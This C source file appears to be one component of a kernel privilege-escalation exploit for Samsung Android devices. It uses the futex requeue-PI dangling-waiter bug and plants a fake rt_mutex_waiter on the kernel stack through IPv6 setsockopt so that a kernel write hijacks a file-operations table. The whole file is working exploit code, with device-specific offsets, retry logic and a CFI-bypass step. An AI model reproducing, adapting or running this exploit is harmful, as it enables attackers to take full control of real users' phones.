/*
 * exp_stamp.c — native 64-bit setsockopt stack stamper (S21 port).
 *
 * Replaces the pselect fd_set spray for the MAIN fops-hijack route.
 * Mechanism (same bug, different planter):
 *   FUTEX_WAIT_REQUEUE_PI leaves rt_mutex_waiter on the waiter thread's
 *   kernel stack; after CMP_REQUEUE_PI dangles ->pi_blocked_on, this thread
 *   (the waiter itself, right after WRPI returns) copies an 80-byte fake
 *   waiter onto the same stack via setsockopt(IPPROTO_IPV6,
 *   MCAST_JOIN_SOURCE_GROUP). do_ipv6_setsockopt copies the 264-byte native
 *   group_source_req to its kernel-stack slot BEFORE late validation
 *   (family check -> EADDRNOTAVAIL), with no writeback afterwards.
 *   The parked payload is then walked by the consumer's sched_setattr
 *   (rt_mutex_adjust_pi -> rt_mutex_dequeue rb_erase writes fake_fops
 *   into the target, same as the S22 exp32 route).
 *
 * Differences vs S22 exp32 (5.10 b0q/r0s):
 *   - 64-bit native path (no ARMv7 child needed): on 5.4 the compat
 *     setsockopt translates 260B->264B in userspace scratch and calls the
 *     SAME native handler, so compat buys no geometry. Native optlen=264.
 *   - Stamp offset is tunable at runtime (EXP_STAMP_OFF env, hex) because
 *     the 5.4 waiter-vs-greqs delta is measured on-device, not assumed.
 *   - Stamp-then-park discipline from S22 is kept: probe once, loop N
 *     stamps, release the consumer, then NO syscalls until the consumer
 *     window closes (post-stamp printf/write would land a file_tty_write
 *     frame on the slot and tear the payload).
 */
#include "common.h"

#include <errno.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE

#ifndef EXP_STAMP_SIZE
#define EXP_STAMP_SIZE 264 /* sizeof(struct group_source_req), native */
#endif
#ifndef EXP_STAMP_ROUNDS
#define EXP_STAMP_ROUNDS 64
#endif
#ifndef EXP_STAMP_ROUTE_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define EXP_STAMP_ROUTE_ATTEMPTS 4
#else
#define EXP_STAMP_ROUTE_ATTEMPTS 1
#endif
#endif
/* Compile-time center; device-tuned per firmware (S22 b0q=0x58, r0s=0x68). */
#ifndef EXP_STAMP_OFF
#ifdef MCAST_WAITER_OFF
#define EXP_STAMP_OFF MCAST_WAITER_OFF
#else
#define EXP_STAMP_OFF 0x58
#endif
#endif
/* 5.4 rt_mutex_waiter = 80 bytes, no wake_state/ww_ctx. */
#ifndef EXP_WAITER_BYTES
#define EXP_WAITER_BYTES 0x50
#endif

static uint64_t exp_stamp_off(void) {
  const char *env = getenv("EXP_STAMP_OFF");
  if (env && *env) {
    char *end = NULL;
    errno = 0;
    unsigned long v = strtoul(env, &end, 0);
    if (!errno && end != env && !*end &&
        v + EXP_WAITER_BYTES <= EXP_STAMP_SIZE)
      return (uint64_t)v;
    pr_warning("exp stamp bad EXP_STAMP_OFF=%s, using default %#x\n", env,
               EXP_STAMP_OFF);
  }
  return (uint64_t)EXP_STAMP_OFF;
}

static int exp_stamp_rounds(void) {
  const char *env = getenv("EXP_STAMP_ROUNDS");
  if (env && *env) {
    char *end = NULL;
    errno = 0;
    long v = strtol(env, &end, 0);
    if (!errno && end != env && !*end && v >= 1 && v <= 100000)
      return (int)v;
  }
  return EXP_STAMP_ROUNDS;
}

/* 80-byte fake waiter, S22 5.10 map (identical 5.4 layout):
 * +0x00 rb_parent_color = fake_fops, +0x08 rb_right = 0,
 * +0x10 rb_left = write target, +0x18..+0x28 pi_tree = 0,
 * +0x30 task, +0x38 lock, +0x40 prio, +0x48 deadline. */
static void exp_build_waiter(unsigned char *at) {
  uint64_t *w = (uint64_t *)at;
  w[0] = (uint64_t)fake_fops;
  w[1] = 0;
  w[2] = (uint64_t)data_addr(ASHMEM_MISC_FOPS);
  w[3] = 0;
  w[4] = 0;
  w[5] = 0;
  w[6] = (uint64_t)fake_task;
  w[7] = (uint64_t)fake_lock;
  w[8] = 0;
  w[9] = 0;
}

void do_setsockopt_stamp_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("stamp route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  uint64_t stamp_off = exp_stamp_off();
  int rounds = exp_stamp_rounds();

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= EXP_STAMP_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("stamp retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    unsigned char stamp[EXP_STAMP_SIZE];
    memset(stamp, 0, sizeof(stamp));
    exp_build_waiter(stamp + stamp_off);

    int fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_warning("stamp socket errno=%d\n", errno);
      break;
    }

    /* Probe once: EADDRNOTAVAIL/EINVAL = late validation, copy landed.
     * EACCES (or early EINVAL) = denied before the copy, payload dead. */
    errno = 0;
    int probe =
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, stamp,
                   sizeof(stamp));
    int probe_errno = errno;
    if (probe == 0 || (probe != 0 && probe_errno == EACCES)) {
      cfi_last_step = 35;
      cfi_last_errno = probe_errno;
      pr_warning("stamp probe off=%#llx rc=%d errno=%d: copy did NOT land\n",
                 (unsigned long long)stamp_off, probe, probe_errno);
      close(fd);
      break;
    }

    for (int i = 0; i < rounds; i++)
      setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, stamp,
                 sizeof(stamp));

    /* Payload parked: release the consumer, then NO syscalls until the
     * window closes (see file header). */
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&punch_consume_go, route_attempt);
    while (!atomic_load(&punch_consume_stop))
      __asm__ volatile("yield" ::: "memory");
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    /* Window closed: logging/syscalls safe again. */
    pr_info("stamp returned attempt=%d off=%#llx rounds=%d probe_errno=%d "
            "calls=%d success=%d\n",
            route_attempt, (unsigned long long)stamp_off, rounds,
            probe_errno, calls, success);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = probe_errno;
    }

    close(fd);

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("stamp cfi miss attempt=%d/%d step=%d; refreshing FOPS page\n",
            route_attempt, EXP_STAMP_ROUTE_ATTEMPTS, cfi_last_step);
  }
}

#endif /* !APP_PHYS_P0_ORACLE */
